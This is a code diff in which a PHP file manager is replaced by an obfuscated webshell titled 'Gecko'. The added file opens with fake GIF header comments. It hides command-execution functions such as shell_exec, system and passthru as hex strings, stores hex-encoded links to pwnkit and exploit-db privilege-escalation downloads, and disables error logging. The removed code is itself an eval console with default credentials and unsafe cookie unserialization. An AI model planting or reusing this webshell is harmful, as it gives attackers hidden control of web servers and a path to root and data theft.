@@ -1,1855 +1,1287 @@
-﻿xoxo﻿xoxo<?php
-/* PHP File manager ver 1.5 */
-// @Nafisfuad1
-// Configuration — do not change manually!
-$authorization = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30","script":"<script type=\"text\/javascript\" src=\"https:\/\/www.cdolivet.com\/editarea\/editarea\/edit_area\/edit_area_full.js\"><\/script>\r\n<script language=\"Javascript\" type=\"text\/javascript\">\r\neditAreaLoader.init({\r\nid: \"newcontent\"\r\n,display: \"later\"\r\n,start_highlight: true\r\n,allow_resize: \"both\"\r\n,allow_toggle: true\r\n,word_wrap: true\r\n,language: \"ru\"\r\n,syntax: \"php\"\t\r\n,toolbar: \"search, go_to_line, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help\"\r\n,syntax_selection_allow: \"css,html,js,php,python,xml,c,cpp,sql,basic,pas\"\r\n});\r\n<\/script>"}';
-$php_templates = '{"Settings":"global $fm_config;\r\nvar_export($fm_config);","Backup SQL tables":"echo fm_backup_tables();"}';
-$sql_templates = '{"All bases":"SHOW DATABASES;","All tables":"SHOW TABLES;"}';
-$translation = '{"id":"en","Add":"Add","Are you sure you want to delete this directory (recursively)?":"Are you sure you want to delete this directory (recursively)?","Are you sure you want to delete this file?":"Are you sure you want to delete this file?","Archiving":"Archiving","Authorization":"Authorization","Back":"Back","Cancel":"Cancel","Chinese":"Chinese","Compress":"Compress","Console":"Console","Cookie":"Cookie","Created":"Created","Date":"Date","Days":"Days","Decompress":"Decompress","Delete":"Delete","Deleted":"Deleted","Download":"Download","done":"done","Edit":"Edit","Enter":"Enter","English":"English","Error occurred":"Error occurred","File manager":"File manager","File selected":"File selected","File updated":"File updated","Filename":"Filename","Files uploaded":"Files uploaded","French":"French","Generation time":"Generation time","German":"German","Home":"Home","Quit":"Quit","Language":"Language","Login":"Login","Manage":"Manage","Make directory":"Make directory","Name":"Name","New":"New","New file":"New file","no files":"no files","Password":"Password","pictures":"pictures","Recursively":"Recursively","Rename":"Rename","Reset":"Reset","Reset settings":"Reset settings","Restore file time after editing":"Restore file time after editing","Result":"Result","Rights":"Rights","Russian":"Russian","Save":"Save","Select":"Select","Select the file":"Select the file","Settings":"Settings","Show":"Show","Show size of the folder":"Show size of the folder","Size":"Size","Spanish":"Spanish","Submit":"Submit","Task":"Task","templates":"templates","Ukrainian":"Ukrainian","Upload":"Upload","Value":"Value","Hello":"Hello","Found in files":"Found in files","Search":"Search","Recursive search":"Recursive search","Mask":"Mask"}';
-// end configuration
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<?php
 
-// Preparations
-$starttime = explode(' ', microtime());
-$starttime = $starttime[1] + $starttime[0];
-$langs = array('en','ru','de','fr','uk');
-$path = empty($_REQUEST['path']) ? $path = realpath('.') : realpath($_REQUEST['path']);
-$path = str_replace('\\', '/', $path) . '/';
-$main_path=str_replace('\\', '/',realpath('./'));
-$phar_maybe = (version_compare(phpversion(),"5.3.0","<"))?true:false;
-$msg = ''; // service string
-$default_language = 'ru';
-$detect_lang = true;
-$fm_version = 1.4;
-
-//Authorization
-$auth = json_decode($authorization,true);
-$auth['authorize'] = isset($auth['authorize']) ? $auth['authorize'] : 0; 
-$auth['days_authorization'] = (isset($auth['days_authorization'])&&is_numeric($auth['days_authorization'])) ? (int)$auth['days_authorization'] : 30;
-$auth['login'] = isset($auth['login']) ? $auth['login'] : 'admin';  
-$auth['password'] = isset($auth['password']) ? $auth['password'] : 'phpfm';  
-$auth['cookie_name'] = isset($auth['cookie_name']) ? $auth['cookie_name'] : 'fm_user';
-$auth['script'] = isset($auth['script']) ? $auth['script'] : '';
-
-// Little default config
-$fm_default_config = array (
-	'make_directory' => true, 
-	'new_file' => true, 
-	'upload_file' => true, 
-	'show_dir_size' => false, //if true, show directory size → maybe slow 
-	'show_img' => true, 
-	'show_php_ver' => true, 
-	'show_php_ini' => false, // show path to current php.ini
-	'show_gt' => true, // show generation time
-	'enable_php_console' => true,
-	'enable_sql_console' => true,
-	'sql_server' => 'localhost',
-	'sql_username' => 'root',
-	'sql_password' => '',
-	'sql_db' => 'test_base',
-	'enable_proxy' => true,
-	'show_phpinfo' => true,
-	'show_xls' => true,
-	'fm_settings' => true,
-	'restore_time' => true,
-	'fm_restore_time' => false,
-);
-
-if (empty($_COOKIE['fm_config'])) $fm_config = $fm_default_config;
-else $fm_config = unserialize($_COOKIE['fm_config']);
-
-// Change language
-if (isset($_POST['fm_lang'])) { 
-	setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $auth['days_authorization']));
-	$_COOKIE['fm_lang'] = $_POST['fm_lang'];
-}
-$language = $default_language;
-
-// Detect browser language
-if($detect_lang && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) && empty($_COOKIE['fm_lang'])){
-	$lang_priority = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
-	if (!empty($lang_priority)){
-		foreach ($lang_priority as $lang_arr){
-			$lng = explode(';', $lang_arr);
-			$lng = $lng[0];
-			if(in_array($lng,$langs)){
-				$language = $lng;
-				break;
-			}
-		}
-	}
-} 
-
-// Cookie language is primary for ever
-$language = (empty($_COOKIE['fm_lang'])) ? $language : $_COOKIE['fm_lang'];
-
-// Localization
-$lang = json_decode($translation,true);
-if ($lang['id']!=$language) {
-	$get_lang = file_get_contents('https://raw.githubusercontent.com/Den1xxx/Filemanager/master/languages/' . $language . '.json');
-	if (!empty($get_lang)) {
-		//remove unnecessary characters
-		$translation_string = str_replace("'",'&#39;',json_encode(json_decode($get_lang),JSON_UNESCAPED_UNICODE));
-		$fgc = file_get_contents(__FILE__);
-		$search = preg_match('#translation[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $fgc, $matches);
-		if (!empty($matches[1])) {
-			$filemtime = filemtime(__FILE__);
-			$replace = str_replace('{"'.$matches[1].'"}',$translation_string,$fgc);
-			if (file_put_contents(__FILE__, $replace)) {
-				$msg .= __('File updated');
-			}	else $msg .= __('Error occurred');
-			if (!empty($fm_config['fm_restore_time'])) touch(__FILE__,$filemtime);
-		}	
-		$lang = json_decode($translation_string,true);
-	}
+$Array = [
+    '7368656c6c5f65786563',
+    '65786563',
+    '7061737374687275',
+    '73797374656d',
+    '70726f635f6f70656e',
+    '706f70656e',
+    '70636c6f7365',
+    '72657475726e',
+    '73747265616d5f6765745f636f6e74656e7473',
+    '676574637764', // g e t c w d => 9 
+    '6368646972', // c h d i r => 10
+    '7068705f756e616d65', // p h p _ u n a m e => 11
+    '6973736574',
+    '66756e6374696f6e5f657869737473',
+    '5f6d61645f636d64',
+    '245f5345525645525b275345525645525f4e414d45275d',
+    '676c6f62', // g l o b => 16
+    '69735f66696c65', // i s _ f i l e => 17
+    '69735f646972', // i s _ d i r => 18
+    '69735f7772697461626c65', // i s _ w r i t e a b l e => 19
+    '69735f7265616461626c65', // i s _ r e a d b l e => 20
+    '66696c6573697a65', // f i l e _ s i z e => 21
+    '6765745f63757272656e745f75736572', // user => 22
+    '5345525645525f534f465457415245', // Server Software => 23
+    '66696c656d74696d65', // f i l e m t i m e => 24
+    '746f756368', // t o u c h => 25
+    '6d6b646972', // m k d i r => 26
+    '66696c655f6765745f636f6e74656e7473', // f i l e g e t c o n t e n t s => 27
+    '66696c655f7075745f636f6e74656e7473', // f i l e p u t => 28
+    '726d646972', // r m d i r => 29
+    '756e6c696e6b', // u n l i n k => 30
+    '66696c65', // f i l e => 31
+    '6d756c7469706172742f666f726d2d64617461', // m u l t i p a r t / f o r m d a t a => 32
+    '444f43554d454e545f524f4f54', // r o o t d o c => 33 
+    '68747470733a2f2f6769746875622e636f6d2f4d61644578706c6f6974732f50726976656c6567652d657363616c6174696f6e2f7261772f6d61696e2f70776e6b6974', // Source maybe? => 34
+    '68747470733a2f2f7777772e6578706c6f69742d64622e636f6d2f646f776e6c6f61642f3430383339' // ex => 35
+];
+$hitung_array = count($Array);
+for ($i = 0; $i < $hitung_array; $i++) {
+    $fungsi[] = unhex($Array[$i]);
 }
 
-/* Functions */
 
-//translation
-function __($text){
-	global $lang;
-	if (isset($lang[$text])) return $lang[$text];
-	else return $text;
-};
 
-//delete files and dirs recursively
-function fm_del_files($file, $recursive = false) {
-	if($recursive && @is_dir($file)) {
-		$els = fm_scan_dir($file, '', '', true);
-		foreach ($els as $el) {
-			if($el != '.' && $el != '..'){
-				fm_del_files($file . '/' . $el, true);
-			}
-		}
-	}
-	if(@is_dir($file)) {
-		return rmdir($file);
-	} else {
-		return @unlink($file);
-	}
+if (!empty($_GET['download'])) {
+    $nameNyafile = basename($_GET['download']);
+    $pathFilenya = $fungsi[9]() . "/" . $nameNyafile;
+    if (!empty($nameNyafile) && file_exists($pathFilenya)) {
+
+        // Define Headers
+        header('Cache-control: public');
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . $nameNyafile . '"');
+        header('Content-Transfer-Encoding: binary');
+        readfile($pathFilenya);
+        exit;
+    }
 }
 
-//file perms
-function fm_rights_string($file, $if = false){
-	$perms = fileperms($file);
-	$info = '';
-	if(!$if){
-		if (($perms & 0xC000) == 0xC000) {
-			//Socket
-			$info = 's';
-		} elseif (($perms & 0xA000) == 0xA000) {
-			//Symbolic Link
-			$info = 'l';
-		} elseif (($perms & 0x8000) == 0x8000) {
-			//Regular
-			$info = '-';
-		} elseif (($perms & 0x6000) == 0x6000) {
-			//Block special
-			$info = 'b';
-		} elseif (($perms & 0x4000) == 0x4000) {
-			//Directory
-			$info = 'd';
-		} elseif (($perms & 0x2000) == 0x2000) {
-			//Character special
-			$info = 'c';
-		} elseif (($perms & 0x1000) == 0x1000) {
-			//FIFO pipe
-			$info = 'p';
-		} else {
-			//Unknown
-			$info = 'u';
-		}
-	}
-  
-	//Owner
-	$info .= (($perms & 0x0100) ? 'r' : '-');
-	$info .= (($perms & 0x0080) ? 'w' : '-');
-	$info .= (($perms & 0x0040) ?
-	(($perms & 0x0800) ? 's' : 'x' ) :
-	(($perms & 0x0800) ? 'S' : '-'));
- 
-	//Group
-	$info .= (($perms & 0x0020) ? 'r' : '-');
-	$info .= (($perms & 0x0010) ? 'w' : '-');
-	$info .= (($perms & 0x0008) ?
-	(($perms & 0x0400) ? 's' : 'x' ) :
-	(($perms & 0x0400) ? 'S' : '-'));
- 
-	//World
-	$info .= (($perms & 0x0004) ? 'r' : '-');
-	$info .= (($perms & 0x0002) ? 'w' : '-');
-	$info .= (($perms & 0x0001) ?
-	(($perms & 0x0200) ? 't' : 'x' ) :
-	(($perms & 0x0200) ? 'T' : '-'));
 
-	return $info;
-}
+?>
 
-function fm_convert_rights($mode) {
-	$mode = str_pad($mode,9,'-');
-	$trans = array('-'=>'0','r'=>'4','w'=>'2','x'=>'1');
-	$mode = strtr($mode,$trans);
-	$newmode = '0';
-	$owner = (int) $mode[0] + (int) $mode[1] + (int) $mode[2]; 
-	$group = (int) $mode[3] + (int) $mode[4] + (int) $mode[5]; 
-	$world = (int) $mode[6] + (int) $mode[7] + (int) $mode[8]; 
-	$newmode .= $owner . $group . $world;
-	return intval($newmode, 8);
-}
+<!DOCTYPE html>
+<html lang="en">
 
-function fm_chmod($file, $val, $rec = false) {
-	$res = @chmod(realpath($file), $val);
-	if(@is_dir($file) && $rec){
-		$els = fm_scan_dir($file);
-		foreach ($els as $el) {
-			$res = $res && fm_chmod($file . '/' . $el, $val, true);
-		}
-	}
-	return $res;
-}
+<head>
+    <meta charset="UTF-8">
+    <title>Gecko [ <?= $_SERVER['HTTP_HOST']; ?> ]</title>
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
+    <script src='https://kit.fontawesome.com/057b9b510c.js' crossorigin='anonymous'></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
 
-//load files
-function fm_download($file_name) {
-    if (!empty($file_name)) {
-		if (file_exists($file_name)) {
-			header("Content-Disposition: attachment; filename=" . basename($file_name));   
-			header("Content-Type: application/force-download");
-			header("Content-Type: application/octet-stream");
-			header("Content-Type: application/download");
-			header("Content-Description: File Transfer");            
-			header("Content-Length: " . filesize($file_name));		
-			flush(); // this doesn't really matter.
-			$fp = fopen($file_name, "r");
-			while (!feof($fp)) {
-				echo fread($fp, 65536);
-				flush(); // this is essential for large downloads
-			} 
-			fclose($fp);
-			die();
-		} else {
-			header('HTTP/1.0 404 Not Found', true, 404);
-			header('Status: 404 Not Found'); 
-			die();
+        body {
+            font-family: monospace;
+            background-color: #1A1A1D;
+            color: white;
         }
-    } 
+
+        a {
+            text-decoration: none;
+            color: white;
+        }
+
+        tr th {
+            text-align: center;
+            font-weight: bold;
+            padding: 10px;
+        }
+
+        tr td:nth-child(3) {
+            text-align: center;
+        }
+
+        tr td {
+            padding: 10px;
+            font-weight: bold;
+        }
+
+        thead {
+            background-color: #29292e;
+            color: white;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        ul li {
+            font-weight: bold;
+        }
+
+        h1 {
+            font-family: 'Nanum Brush Script', cursive;
+
+        }
+
+        tbody tr:nth-child(even) {
+            background: #29292e;
+        }
+
+        .pwd {
+            padding: 5px;
+            background-color: #29292e;
+        }
+
+        form li {
+            margin: 15px;
+            margin-left: -5px;
+        }
+
+        form li input[type="file"] {
+            border: 1px solid;
+            padding: 3.5px 4px;
+            background-color: #29292e;
+            color: white;
+            border-radius: 5px;
+        }
+
+        .upload-submit {
+            float: left;
+            padding: 6.4px 50px;
+            margin-right: 10px;
+            font-weight: bold;
+            background-color: #29292e;
+            border: none;
+            color: #1e9fc7;
+            box-shadow: 1.5px 1.5px #303038;
+            border-radius: 3px;
+        }
+
+        .upload-submit:hover {
+            background-color: #d5dbd6;
+            color: black;
+        }
+
+        .link-shell:hover::after {
+            content: "";
+            border-bottom: 2px solid white;
+            display: block;
+            padding-bottom: 5px;
+            margin-bottom: -7px;
+            animation-name: link-shell;
+            animation-duration: 0.6s;
+        }
+
+        @keyframes link-shell {
+            from {
+                width: 0;
+            }
+
+            to {
+                width: 100%;
+            }
+        }
+
+        .tool-menu li {
+            display: inline-block;
+            font-weight: none;
+            padding: 13px 7px;
+        }
+
+        .tool-menu li a {
+            padding: 7px 30px;
+            color: #1e9fc7;
+            background-color: #29292e;
+            border-radius: 3px;
+            box-shadow: 1.5px 1.5px #303038;
+        }
+
+        .tool-menu li a:hover {
+            background-color: #d5dbd6;
+            color: black;
+            box-shadow: 1.5px 1.5px #d5dbd6;
+        }
+
+        .list-tool {
+            padding: 1px;
+        }
+
+        .settings {
+            float: right;
+            position: relative;
+            margin-top: -250px;
+
+        }
+
+        .settings select {
+            padding: 5.5px 35px;
+            background-color: #303038;
+            border: none;
+            color: white;
+            border-radius: 4px;
+        }
+
+        .select-submit {
+            padding: 6.5px 50px;
+            margin-right: 10px;
+            background-color: #303038;
+            border: none;
+            color: white;
+            border-radius: 4px;
+        }
+
+        .select-submit:hover {
+            background-color: #d5dbd6;
+            color: black;
+        }
+
+        .action-gecko:hover {
+            background-color: #d5dbd6;
+            color: black;
+        }
+
+        .tool-menu-header {
+            margin: -13px 0px;
+        }
+
+        .create {
+            background-color: rgba(0, 0, 0, 0.3);
+            position: fixed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            width: 100vw;
+            animation: modal-box;
+            animation-duration: 0.5s;
+            animation-fill-mode: both;
+
+        }
+
+        @keyframes modal-box {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .modal {
+            border-radius: 10px;
+            background-color: white;
+            color: black;
+            width: 600px;
+            max-width: 100%;
+            padding: 18px;
+        }
+
+        .modal a {
+            background-color: #29292e;
+            padding: 8px 15px;
+            border-radius: 3px;
+        }
+
+        .modal ul {
+            float: right;
+        }
+
+        .modal ul li {
+            display: inline;
+        }
+
+        .btn-modal {
+            background-color: #29292e;
+            color: white;
+            border-radius: 3px;
+            padding: 8px 15px;
+            border: none;
+        }
+
+        .modal input[type="text"] {
+            width: 100%;
+            height: 30px;
+            border-radius: 3px;
+            border: 1px solid black;
+        }
+
+        .fw-bold {
+            font-weight: bold;
+        }
+
+        .file-size {
+            color: #1e9fc7;
+        }
+
+        th {
+            color: #1e9fc7;
+        }
+
+        .fa-folder {
+            color: orange;
+        }
+
+        .fa-file {
+            color: #1e9fc7;
+        }
+
+        .terminal-content {
+            z-index: 10;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.5);
+            animation: modal-box;
+            animation-duration: 0.5s;
+            animation-fill-mode: both;
+            font-weight: bold;
+        }
+
+        .terminal-body {
+            margin: auto;
+            margin-top: 60px;
+            z-index: 20;
+            width: 90%;
+            background: white;
+            height: 65vh;
+            color: black;
+            border-radius: 5px;
+        }
+
+        .terminal-body header {
+            text-align: center;
+            padding: 4px;
+            background: #1A1A1D;
+            color: white;
+        }
+
+        .terminal-body header a {
+            float: right;
+            color: black;
+            font-size: large;
+            background-color: white;
+            position: relative;
+            z-index: 11;
+            border-radius: 5px;
+            margin-top: -45px;
+            padding: 10px 30px;
+        }
+
+        .terminal-body header a:hover {
+            background-color: #29292e;
+            color: white;
+            border: 1px solid #303038;
+        }
+
+        .output-terminal {
+            width: 99.5%;
+            height: 100%;
+            color: black;
+            background-color: white;
+        }
+
+        .terminal-input {
+            width: 90%;
+            padding: 6px;
+            margin-left: 1px;
+            border: none;
+            border-bottom: 2px solid black;
+        }
+
+        .terminal-submit {
+            margin: 2.5px;
+            padding: 7.5px 25px;
+            background-color: black;
+            color: white;
+            border: none;
+            border-radius: 3px;
+        }
+
+        .pwd-body {
+            padding: 15px 8px;
+            font-weight: bold;
+        }
+
+
+        .border {
+            border: 1px solid black;
+            border-radius: 2px;
+        }
+
+        .file-box {
+            position: fixed;
+            width: 100%;
+            height: 100vh;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1;
+        }
+
+        .file-content {
+            width: 90%;
+            background-color: white;
+            height: 70%;
+            margin: auto;
+            margin-top: 20px;
+            color: black;
+        }
+
+        .file-content textarea {
+            width: 99.5%;
+            height: 70vh;
+        }
+
+        .file-header {
+            background-color: #1A1A1D;
+            padding: 15px;
+        }
+
+        .file-header ul {
+            list-style: none;
+        }
+
+        .file-header li {
+            display: inline-block;
+            margin: 0px 30px;
+        }
+
+        .file-header li:nth-child(3) {
+            float: right;
+            margin-right: -5px;
+        }
+
+        .file-header li:nth-child(3) a {
+            color: black;
+            font-size: large;
+            background-color: white;
+            z-index: 11;
+            border-radius: 5px;
+            padding: 10px 30px;
+        }
+
+        .file-header li:nth-child(3) a:hover {
+            background-color: #29292e;
+            color: white;
+            border: 1px solid #303038;
+        }
+
+        .file-header li button {
+            color: black;
+            cursor: pointer;
+            font-weight: bold;
+            background: white;
+            font-size: 15px;
+            border: 1px solid white;
+            padding: 10px 15px;
+            margin: -10px -15px;
+            border-radius: 5px;
+        }
+
+        .link-rename {
+            padding: 10px 15px;
+            border: 1px solid white;
+            background-color: white;
+            color: black;
+            border-radius: 5px;
+            margin: -10px -15px;
+        }
+    </style>
+</head>
+<?php
+@set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+
+
+function Redirect($url, $permanent = false)
+{
+    header('Location: ' . $url, true, $permanent ? 301 : 302);
+
+    exit();
 }
 
-//show folder size
-function fm_dir_size($f,$format=true) {
-	if($format)  {
-		$size=fm_dir_size($f,false);
-		if($size<=1024) return $size.' bytes';
-		elseif($size<=1024*1024) return round($size/(1024),2).'&nbsp;Kb';
-		elseif($size<=1024*1024*1024) return round($size/(1024*1024),2).'&nbsp;Mb';
-		elseif($size<=1024*1024*1024*1024) return round($size/(1024*1024*1024),2).'&nbsp;Gb';
-		elseif($size<=1024*1024*1024*1024*1024) return round($size/(1024*1024*1024*1024),2).'&nbsp;Tb'; //:)))
-		else return round($size/(1024*1024*1024*1024*1024),2).'&nbsp;Pb'; // ;-)
-	} else {
-		if(is_file($f)) return filesize($f);
-		$size=0;
-		$dh=opendir($f);
-		while(($file=readdir($dh))!==false) {
-			if($file=='.' || $file=='..') continue;
-			if(is_file($f.'/'.$file)) $size+=filesize($f.'/'.$file);
-			else $size+=fm_dir_size($f.'/'.$file,false);
-		}
-		closedir($dh);
-		return $size+filesize($f); 
-	}
-}
 
-//scan directory
-function fm_scan_dir($directory, $exp = '', $type = 'all', $do_not_filter = false) {
-	$dir = $ndir = array();
-	if(!empty($exp)){
-		$exp = '/^' . str_replace('*', '(.*)', str_replace('.', '\\.', $exp)) . '$/';
-	}
-	if(!empty($type) && $type !== 'all'){
-		$func = 'is_' . $type;
-	}
-	if(@is_dir($directory)){
-		$fh = opendir($directory);
-		while (false !== ($filename = readdir($fh))) {
-			if(substr($filename, 0, 1) != '.' || $do_not_filter) {
-				if((empty($type) || $type == 'all' || $func($directory . '/' . $filename)) && (empty($exp) || preg_match($exp, $filename))){
-					$dir[] = $filename;
-				}
-			}
-		}
-		closedir($fh);
-		natsort($dir);
-	}
-	return $dir;
-}
 
-function fm_link($get,$link,$name,$title='') {
-	if (empty($title)) $title=$name.' '.basename($link);
-	return '&nbsp;&nbsp;<a href="?'.$get.'='.base64_encode($link).'" title="'.$title.'">'.$name.'</a>';
+if (isset($_GET['dir'])) {
+    $cdir = unhex($_GET['dir']);
+    $fungsi[10]($cdir);
+} else {
+    $cdir = $fungsi[9]();
 }
+$get_cwd = $fungsi[9]();
+$scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
 
-function fm_arr_to_option($arr,$n,$sel=''){
-	foreach($arr as $v){
-		$b=$v[$n];
-		$res.='<option value="'.$b.'" '.($sel && $sel==$b?'selected':'').'>'.$b.'</option>';
-	}
-	return $res;
-}
+?>
 
-function fm_lang_form ($current='en'){
-return '
-<form name="change_lang" method="post" action="">
-	<select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >
-		<option value="en" '.($current=='en'?'selected="selected" ':'').'>'.__('English').'</option>
-		<option value="de" '.($current=='de'?'selected="selected" ':'').'>'.__('German').'</option>
-		<option value="ru" '.($current=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>
-		<option value="fr" '.($current=='fr'?'selected="selected" ':'').'>'.__('French').'</option>
-		<option value="uk" '.($current=='uk'?'selected="selected" ':'').'>'.__('Ukrainian').'</option>
-	</select>
-</form>
-';
-}
-	
-function fm_root($dirname){
-	return ($dirname=='.' OR $dirname=='..');
-}
-
-function fm_php($string){
-	$display_errors=ini_get('display_errors');
-	ini_set('display_errors', '1');
-	ob_start();
-	eval(trim($string));
-	$text = ob_get_contents();
-	ob_end_clean();
-	ini_set('display_errors', $display_errors);
-	return $text;
-}
-
-//SHOW DATABASES
-function fm_sql_connect(){
-	global $fm_config;
-	return new mysqli($fm_config['sql_server'], $fm_config['sql_username'], $fm_config['sql_password'], $fm_config['sql_db']);
-}
-
-function fm_sql($query){
-	global $fm_config;
-	$query=trim($query);
-	ob_start();
-	$connection = fm_sql_connect();
-	if ($connection->connect_error) {
-		ob_end_clean();	
-		return $connection->connect_error;
-	}
-	$connection->set_charset('utf8');
-    $queried = mysqli_query($connection,$query);
-	if ($queried===false) {
-		ob_end_clean();	
-		return mysqli_error($connection);
-    } else {
-		if(!empty($queried)){
-			while($row = mysqli_fetch_assoc($queried)) {
-				$query_result[]=  $row;
-			}
-		}
-		$vdump=empty($query_result)?'':var_export($query_result,true);	
-		ob_end_clean();	
-		$connection->close();
-		return '<pre>'.stripslashes($vdump).'</pre>';
-	}
-}
-
-function fm_backup_tables($tables = '*', $full_backup = true) {
-	global $path;
-	$mysqldb = fm_sql_connect();
-	$delimiter = "; \n  \n";
-	if($tables == '*')	{
-		$tables = array();
-		$result = $mysqldb->query('SHOW TABLES');
-		while($row = mysqli_fetch_row($result))	{
-			$tables[] = $row[0];
-		}
-	} else {
-		$tables = is_array($tables) ? $tables : explode(',',$tables);
-	}
-    
-	$return='';
-	foreach($tables as $table)	{
-		$result = $mysqldb->query('SELECT * FROM '.$table);
-		$num_fields = mysqli_num_fields($result);
-		$return.= 'DROP TABLE IF EXISTS `'.$table.'`'.$delimiter;
-		$row2 = mysqli_fetch_row($mysqldb->query('SHOW CREATE TABLE '.$table));
-		$return.=$row2[1].$delimiter;
-        if ($full_backup) {
-		for ($i = 0; $i < $num_fields; $i++)  {
-			while($row = mysqli_fetch_row($result)) {
-				$return.= 'INSERT INTO `'.$table.'` VALUES(';
-				for($j=0; $j<$num_fields; $j++)	{
-					$row[$j] = addslashes($row[$j]);
-					$row[$j] = str_replace("\n","\\n",$row[$j]);
-					if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
-					if ($j<($num_fields-1)) { $return.= ','; }
-				}
-				$return.= ')'.$delimiter;
-			}
-		  }
-		} else { 
-		$return = preg_replace("#AUTO_INCREMENT=[\d]+ #is", '', $return);
-		}
-		$return.="\n\n\n";
-	}
-
-	//save file
-    $file=gmdate("Y-m-d_H-i-s",time()).'.sql';
-	$handle = fopen($file,'w+');
-	fwrite($handle,$return);
-	fclose($handle);
-	$alert = 'onClick="if(confirm(\''. __('File selected').': \n'. $file. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'?delete=' . $file . '&path=' . $path  . '\'"';
-    return $file.': '.fm_link('download',$path.$file,__('Download'),__('Download').' '.$file).' <a href="#" title="' . __('Delete') . ' '. $file . '" ' . $alert . '>' . __('Delete') . '</a>';
-}
-
-function fm_restore_tables($sqlFileToExecute) {
-	$mysqldb = fm_sql_connect();
-	$delimiter = "; \n  \n";
-    // Load and explode the sql file
-    $f = fopen($sqlFileToExecute,"r+");
-    $sqlFile = fread($f,filesize($sqlFileToExecute));
-    $sqlArray = explode($delimiter,$sqlFile);
-	
-    //Process the sql file by statements
-    foreach ($sqlArray as $stmt) {
-        if (strlen($stmt)>3){
-			$result = $mysqldb->query($stmt);
-				if (!$result){
-					$sqlErrorCode = mysqli_errno($mysqldb->connection);
-					$sqlErrorText = mysqli_error($mysqldb->connection);
-					$sqlStmt      = $stmt;
-					break;
-           	     }
-           	  }
-           }
-if (empty($sqlErrorCode)) return __('Success').' — '.$sqlFileToExecute;
-else return $sqlErrorText.'<br/>'.$stmt;
-}
-
-function fm_img_link($filename){
-	return './'.basename(__FILE__).'?img='.base64_encode($filename);
-}
-
-function fm_home_style(){
-	return '
-input, input.fm_input {
-	text-indent: 2px;
-}
-
-input, textarea, select, input.fm_input {
-	color: black;
-	font: normal 8pt Verdana, Arial, Helvetica, sans-serif;
-	border-color: black;
-	background-color: #FCFCFC none !important;
-	border-radius: 0;
-	padding: 2px;
-}
-
-input.fm_input {
-	background: #FCFCFC none !important;
-	cursor: pointer;
-}
-
-.home {
-	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");
-	background-repeat: no-repeat;
-}';
-}
-
-function fm_config_checkbox_row($name,$value) {
-	global $fm_config;
